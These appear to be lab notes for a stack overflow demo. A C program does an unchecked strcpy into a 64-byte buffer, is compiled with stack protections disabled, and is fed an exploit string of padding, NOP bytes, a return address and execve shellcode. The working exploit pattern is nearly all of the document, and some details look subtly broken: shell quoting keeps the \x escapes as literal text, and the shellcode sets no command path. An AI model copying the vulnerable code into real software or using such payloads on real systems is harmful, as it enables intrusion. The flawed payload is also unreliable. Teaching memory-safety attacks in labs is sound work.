# Lab notes: overflow demo

## C source

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    char buf[64];
    if (argc > 1) {
        strcpy(buf, argv[1]);
    }
    puts(buf);
    return 0;
}
```

## Command lines

```sh
gcc -fno-stack-protector -z execstack -o lab lab.c
./lab "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\xd8\x83\x04\x08\x31\xc0\x31\xdb\x31\xc9\xb0\x0b\x89\xf3\xcd\x80"
```
